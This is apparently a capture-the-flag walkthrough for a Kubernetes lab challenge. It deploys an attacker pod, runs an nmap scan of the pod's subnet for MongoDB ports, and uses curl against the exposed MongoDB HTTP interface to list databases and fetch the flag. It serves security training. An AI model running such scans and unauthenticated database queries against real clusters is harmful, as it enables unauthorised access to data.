# K8S Security: Namespace Bypass

## Goal

There is a hidden namespace which has a running mongodb instance.  The goal is to find the instance and find the flag.

1. Install an attacker container.

```
kubectl apply -f 23_pentest_tools.yaml
```

2. Log into the attacker container.

```
kubectl get pods
```
```
kubectl exec -it challenge23-attacker-[POD ID] -- bash
```

3.  Once in the container, get its ip.  I recently learned that the [100.64.0.0/10 space](https://en.wikipedia.org/wiki/IPv4_shared_address_space) is reserved. (!!)

```
ifconfig
```

4. Lets run a nmap scan.  We know from a previous challenge that mongodb is the database of choice. Lets look up its ports to find where mongo is.

```
nmap -p27017,28017 [IP ADDRESS]/24
```

5. We see a host that has these ports open.  

[Default MongoDB Ports.](https://docs.mongodb.com/manual/reference/default-mongodb-port/)

6.  We need to install ping.

```
apt-get update
```
```
apt-get install iputils-ping dnsutils curl iproute2 -y
```
7.  Poke around to find the flags. [Submit the flag](https://devslop.ctfd.io/challenges#Challenge%2023-15)

```
curl http://[IP ADDRESS]:28017/listDatabases
```
```
curl http://[IP ADDRESS]:28017/k8ctf/flag/
```

6. Exit

```
exit
```
